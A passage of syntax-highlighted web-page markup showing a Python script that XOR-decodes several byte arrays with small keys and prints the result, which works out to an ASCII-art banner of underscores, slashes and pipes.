class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">0xA</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>B<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">0xB</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>C<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>C<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    C<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>C<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">0xC</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>C<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>D<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>D<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    D<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>D<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">0xD</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>D<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>E<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>E<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    E<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>E<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">0xE</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>E<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>F<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span 